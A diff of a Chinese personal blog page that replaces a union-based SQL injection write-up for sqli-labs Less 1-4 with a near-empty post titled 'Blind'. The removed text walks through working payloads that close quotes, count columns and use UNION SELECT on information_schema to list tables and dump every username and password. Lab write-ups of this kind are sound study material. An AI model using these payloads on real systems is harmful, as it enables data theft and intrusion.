@@ -3,7 +3,7 @@
 <html lang="zh-CN">
 <head>
     <meta charset="utf-8" />
-    <title>进入sql注入世界的第一天 | blackceng的小窝</title>
+    <title>Blind | blackceng的小窝</title>
     <meta name="author" content="blackceng" />
     <meta name="description" content="我们要做的，就是追上那该死的火车，CJ！" />
     <meta name="keywords" content="" />
@@ -156,14 +156,14 @@
         <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
             <div class="article">
     <div>
-        <h1>进入sql注入世界的第一天</h1>
+        <h1>Blind</h1>
     </div>
     <div class="info">
         <span class="date">
             <span class="icon">
                 <i class="fa-solid fa-calendar fa-fw"></i>
             </span>
-            2025/12/22
+            2025/12/27
         </span>
         
         <span class="category">
@@ -184,7 +184,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/sql-lab/" style="color: #ff7d73">
+                <a href="/tags/sql-lab/" style="color: #ffa2c4">
                     sql_lab
                 </a>
             </span>
@@ -194,58 +194,7 @@
     </div>
     
     <div class="content" v-pre>
-        <h1 id="union型注入（less1-less4"><a href="#union型注入（less1-less4" class="headerlink" title="union型注入（less1-less4)"></a>union型注入（less1-less4)</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>其实刚开始做这类型题时我一直在想为什么</p>
-<p>?id&#x3D;1’ 错误 </p>
-<p>?id&#x3D;1’–+ 回显</p>
-<p>后来才发现我想的太过于复杂，只是相当于一个变量的替换</p>
-<p><code>SELECT * FROM users WHERE id=&#39;1&#39;</code> </p>
-<p>由于他get的是?id&#x3D;后的值，所以当我输入1’–+时，返回去的实际上是SELECT * FROM users WHERE id&#x3D;’1’–+’ ，从而使前面正常输出的同时给我们后续构造恶意语句留足了空间接着又可以注释掉我们输入的‘从而保证语句的正常执行。</p>
-<p>接下来的2，3，4题都是同样的原理，只是他们所用的封闭符号不一样罢了，只要试出来封闭符号就可以解决了例如’,’),”),”,’)),”))。</p>
-<h2 id="判断注入点漏洞类型"><a href="#判断注入点漏洞类型" class="headerlink" title="判断注入点漏洞类型"></a>判断注入点漏洞类型</h2><p>开始我们发现存在SQL注入之后，下一步操作就是要判断注入点的漏洞类型。究竟是字符型还是数字型。</p>
-<ol>
-<li><p><em><strong>数字型</strong></em>：直接将注入点的数据当做数字处理，带入了查询语句中，<em><strong>不需要符号闭合</strong></em>。</p>
-</li>
-<li><p><em><strong>字符型</strong></em>：在拼接SQL查询语句时，对用户的输入使用了单引号或双引号进行闭合。<em><strong>需要进行闭合</strong></em>（强调一点：这和数据库中字段本身的数据类型无关，关键在于SQL语句拼接时是否有引号闭合）</p>
-<h3 id="判断方法"><a href="#判断方法" class="headerlink" title="判断方法"></a>判断方法</h3><p><code>?id=1 and 1=1</code> </p>
-<p>正常回显</p>
-<p><code>?id=1 and 1=2</code></p>
-<p>当1&#x3D;1返回了数据，1&#x3D;2返回不了数据是<strong>数字型注入</strong>，</p>
-<blockquote>
-<p>因为这证明我们恶意输入的SQL语句直接带入了后端查询语句中(SELECT * FROM users WHERE id&#x3D;1 and 1&#x3D;2 LIMIT 0,1)，说明输入点没有引号包裹。</p>
-</blockquote>
-<p>当1 and 1&#x3D;2仍然正常回显，则可能是<strong>字符型（需要闭合引号）或逻辑始终为真。</strong></p>
-<p><code>?id=1</code><br>正常回显</p>
-<p><code>?id=1&#39;</code><br>如果报错是字符型。<br>因为单引号破坏了语句原来的闭合结构，证明需要闭合，</p>
-<p>如果没有报错是数字型。<br>因为输入 1’ 通常 不会导致 SQL 语法错误。数据库引擎会尝试将 1’ 转换为数字。大多数数据库会</p>
-<p>要么 忽略 单引号及其后面的非数字字符，只取 1（可能伴随一个隐式转换警告，但查询语法正确，还是能执行成功）。</p>
-<p>要么 报“数据类型转换错误” (如 Conversion failed when converting the varchar value ‘1’’ to data type int)，但这 不同于 字符型注入中 ‘1’’ 导致的 语法错误 (如 Unclosed quotation mark after the character string)。关键区别在于错误类型（转换错误 vs 语法错误）和是否破坏了语句结构。</p>
-<p>因此只有字符型需要进行闭合。</p>
-<h2 id="判断闭合符号"><a href="#判断闭合符号" class="headerlink" title="判断闭合符号"></a>判断闭合符号</h2><p>在判断完字符型之后，可以尝试各种闭合符号如’,”,’),’)),”),”))，先尝试这些字符然后再后面加上注释符号–+，如果加注释前后发生变化如没加注释报错而加了注释正常回显则说明该闭合符号就是该sql语句的闭合符号</p>
-</li>
-</ol>
-<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h2 id="列数查询"><a href="#列数查询" class="headerlink" title="列数查询"></a>列数查询</h2><p>构造完基本形式，使用order by语句查询一共有多少列。</p>
-<p><code>?id=1&#39; order by 3 --+</code></p>
-<p><em><strong>ORDER BY 3 表示按查询结果中的第3列进行排序</strong></em>。<em><strong>如果查询结果只有2列，那么 ORDER BY 3 就会引用一个不存在的列，从而导致数据库报错。</strong></em> 通过递增 ORDER BY 后的数字（如1,2,3,4…）直到报错，即可确定查询返回的列数（报错前的那个数字就是列数）。–+ 注释掉原语句中可能存在的 LIMIT 等后续部分，保证 ORDER BY 能正确执行和触发错误。</p>
-<p>为什么要判断字段数：在接下来的联合查询形成的语句会是<code>select * where id = 1 union select 1,2,3</code>，联合查询两个select的列数必须一致，<code>*</code>代表所有列，因此要先知道总列数，才能正确设置联合查询的列数</p>
-<h2 id="判断回显"><a href="#判断回显" class="headerlink" title="判断回显"></a>判断回显</h2><p>当我们判断完列数后,由于不是所有列的数据都要进行返回的,所以我们需要查看回显位,判断哪些位置回显的有数据.我们使用特殊符号来标记一下,如果返回了特殊符号,说明这个地方是可以回显的.</p>
-<ul>
-<li><p><code>/?id=1&#39; union select 1,2,3--+</code>   ‘数据回显，但是没有回显注入点<br><code>/?id=0&#39; union select 1,2,3--+</code>   ‘回显注入点为2和3，知道回显点位，我们就可以在该回显点处构造语句来回显我们想要的数据。</p>
-</li>
-<li><p>为什么第二行修改为<code>id=0</code>成功回显：在刚刚的白盒中，我并未介绍<code>LIMIT 0,1</code>的作用，其作用为在查询到的所有数据中，从第0行开始，输出1行。当<code>id=1</code>时，是能够正常查询到数据的，于是只有这一行被输出了。因此我们将id设置为0（或者负数），使得主查询查不到数据，后面联合查询的数据就能正常输出了。主查询没有数据，自然就只会输出后面数据了。</p>
-</li>
-<li><p><code>/?id=0&#39; union select 1,2,database()--+    &#39;</code>数据库security</p>
-<p><code>/?id=0&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</code>         ‘表名emails,referers,uagents,users</p>
-<p><code>/?id=0&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39; --+</code>  ‘字段id,username,password</p>
-<p><code>/?id=0&#39; union select 1,group_concat(username),group_concat(password) from security.users --+</code> </p>
-<ul>
-<li><code>database()</code>：当前数据库名，代替3的位置后，数据库名就会被输出。</li>
-<li><code>group_concat</code>：将得到的所有结果拼接起来并返回，如果不拼接，只会显示查到的第一行结果。</li>
-<li><code>information_schema</code>：是mysql自带的一个特殊的数据库，它记录了所有的表名、列名，通过它，我们就能从数据库名一层层的拆解出我们想要数据的列名、表名，并查询到想要的数据。</li>
-<li>最后就能拿到所有的用户名和密码了。</li>
-</ul>
-</li>
-</ul>
-
+        <h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1>
     </div>
     
     
